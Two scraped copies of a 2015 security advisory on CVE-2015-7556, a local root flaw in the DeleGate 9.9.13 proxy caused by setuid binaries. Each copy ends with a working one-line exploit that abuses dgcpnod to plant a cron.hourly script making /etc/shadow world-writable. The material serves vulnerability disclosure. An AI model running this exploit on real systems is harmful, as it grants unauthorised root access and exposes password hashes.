=== Content from www.vapidlabs.com_41fac2da_20250125_133547.html ===


| Advisory #: 159 |
| --- |
| **Title:** Local root vulnerability in DeleGate v9.9.13 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2015-12-17 |
| **CVE-ID:**[[CVE-2015-7556](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7556)] |
| **CWE:** |
| **Download Site:** <http://www.delegate.org/delegate/download/> |
| **Vendor:** National Institute of Advanced Industrial Science and Technology |
| **Vendor Notified:**  2015-12-17 |
| **Vendor Contact:** y.sato@delegate.org ysato@etl.go.jp |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=159> |
| **Description:** DeleGate is a multipurpose proxy server which relays various application protocols on TCP/IP or UDP/IP, including HTTP, FTP, Telnet, NNTP, SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and more. DeleGate mediates communication between servers and clients where direct communication is impossible, inefficient, or inconvenient. |
| **Vulnerability:**Installation of delegate 9.9.13 sets some binaries setuid root, at least one of these binaries can be used to gain root access. The binary dgcpnod creates a node allowing a local unprivileged user to create files anywhere on disk. By creating a file in /etc/cron.hourly a local user can execute commands as root. Installation of software via source or binary distribution with option to not run as root results in a script set-subin.sh to run setting the setuid bit on four binaries. In Linux distributions where this software is part of the package list these binaries are not setuid root. (archlinux) From documentation http://www.delegate.org/delegate/newbies-ja.shtml: Go is included in the binary distribution, or DGROOT that you can build from the source to the location of preference, and then change the name if necessary. This is the DgRoot. In addition, if needed, you can rename the executable file of DeleGate to the name of the preference. This is the DgExe. "In Unix version subin in if you want to use "(such as when using a privileged port), do the following. (3-2uk) $ cd DgRoot / subin $ Sh setup-subin.sh larry@f4ult:~/dg9\_9\_13/DGROOT/subin$ ls -l total 1916 -r-sr-s--- 1 root larry 384114 Oct 31 2014 dgbind -r-sr-s--- 1 root larry 384598 Oct 31 2014 dgchroot -r-sr-s--- 1 root larry 384161 Oct 31 2014 dgcpnod -rwxr-xr-x 1 larry larry 384114 Oct 31 2014 dgdate -rwxr-xr-x 1 larry larry 29066 Oct 31 2014 dgforkpty -r-sr-s--- 1 root larry 384113 Oct 31 2014 dgpam -rwxr-x--- 1 larry larry 272 Oct 27 2014 setup-subin.sh This script sets the setuid bit: larry@f4ult:~/dg9\_9\_13/DGROOT/subin$ cat setup-subin.sh #!/bin/sh SUBINS="dgpam dgbind dgchroot dgcpnod" sudo sh -c "chown root $SUBINS; chmod 6550 $SUBINS" if [ $? != 0 ]; then su root -c "chown root $SUBINS; chmod 6550 $SUBINS" fi |
| **Export:** [JSON](export_mitre_v4.py?id=159) [TEXT](txt.php?v=159) [XML](xml.php?s=159) |
| **Exploit Code:** ```   1. $ [touch](http://www.php.net/touch) /tmp/rootme; [chmod](http://www.php.net/chmod) +x /tmp/rootme; ./dgcpnod /tmp/rootme /etc/cron.hourly/rootme; echo -e '#!/bin/bash \n chmod 777 /etc/shadow' > /etc/cron.hourly/rootme  ``` |
| **Screen Shots:** |
| **Notes:** |



=== Content from seclists.org_b57c8101_20250125_133546.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](122)
[By Date](date.html#123)
[![Next](/images/right-icon-16x16.png)](124)

[![Previous](/images/left-icon-16x16.png)](120)
[By Thread](index.html#123)
[![Next](/images/right-icon-16x16.png)](124)

![](/shared/images/nst-icons.svg#search)

# Local root vulnerability in DeleGate v9.9.13

---

*From*: "Larry W. Cashdollar" <larry0 () me com>

*Date*: Tue, 29 Dec 2015 10:37:13 -0500

---

```

Title: Local root vulnerability in DeleGate v9.9.13
Author: Larry W. Cashdollar, @_larry0
Date: 2015-12-17
Advisory: <http://www.vapidlabs.com/advisory.php?v=159>

```
Download Sites: <http://delegate.hpcc.jp/delegate/>
<http://delegate.org/delegate/>
```

Vendor: National Institute of Advanced Industrial Science and Technology
Vendor Notified: 2015-12-17
Vendor Contact: y.sato () delegate org ysato () etl go jp

```
Description: DeleGate is a multipurpose proxy server which relays
various application protocols on TCP/IP or UDP/IP, including HTTP, FTP,
Telnet, NNTP, SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and
more. DeleGate mediates communication between servers and clients where
direct communication is impossible, inefficient, or inconvenient.
```

Vulnerability:

```
Installation of delegate 9.9.13 sets some binaries setuid root, at least
one of these binaries can be used to escalate the privileges of a local
user. The binary dgcpnod creates a node allowing a local unprivileged
user to create files anywhere on disk. By creating a file in
/etc/cron.hourly a local user can execute commands as root.
```

```
Installation of software via source or binary distribution with option
to not run as root results in a script set-subin.sh to run setting the
setuid bit on four binaries. In Linux distributions where this software
is part of the package list these binaries are not setuid root. (archlinux)
```

```
From documentation <http://www.delegate.org/delegate/newbies-ja.shtml>
(translated to english):
Go is included in the binary distribution, or DGROOT that you can build
from the source to the location of preference, and then change the name
if necessary. This is the DgRoot. In addition, if needed, you can rename
the executable file of DeleGate to the name of the preference. This is
the DgExe.
"In Unix version subin in if you want to use "(such as when using a
privileged port), do the following.
```

  (3-2uk) $ cd DgRoot / subin
          $ Sh setup-subin.sh

larry@f4ult:~/dg9_9_13/DGROOT/subin$ ls -l
total 1916
-r-sr-s--- 1 root  larry 384114 Oct 31  2014 dgbind
-r-sr-s--- 1 root  larry 384598 Oct 31  2014 dgchroot
-r-sr-s--- 1 root  larry 384161 Oct 31  2014 dgcpnod
-rwxr-xr-x 1 larry larry 384114 Oct 31  2014 dgdate
-rwxr-xr-x 1 larry larry  29066 Oct 31  2014 dgforkpty
-r-sr-s--- 1 root  larry 384113 Oct 31  2014 dgpam
-rwxr-x--- 1 larry larry    272 Oct 27  2014 setup-subin.sh

This script sets the setuid bit on four binaries:

larry@f4ult:~/dg9_9_13/DGROOT/subin$ cat setup-subin.sh
#!/bin/sh

SUBINS="dgpam dgbind dgchroot dgcpnod"
sudo sh -c "chown root $SUBINS; chmod 6550 $SUBINS"
if [ $? != 0 ]; then
  su root -c "chown root $SUBINS; chmod 6550 $SUBINS"
fi
CVEID: 2015-7556
Exploit Code:

```
$ touch /tmp/rootme; chmod +x /tmp/rootme; ./dgcpnod /tmp/rootme
/etc/cron.hourly/rootme; echo -e '#!/bin/bash \n chmod 777 /etc/shadow'
> /etc/cron.hourly/rootme
```

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](122)
[By Date](date.html#123)
[![Next](/images/right-icon-16x16.png)](124)

[![Previous](/images/left-icon-16x16.png)](120)
[By Thread](index.html#123)
[![Next](/images/right-icon-16x16.png)](124)

### Current thread:

* **Local root vulnerability in DeleGate v9.9.13** *Larry W. Cashdollar (Dec 29)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


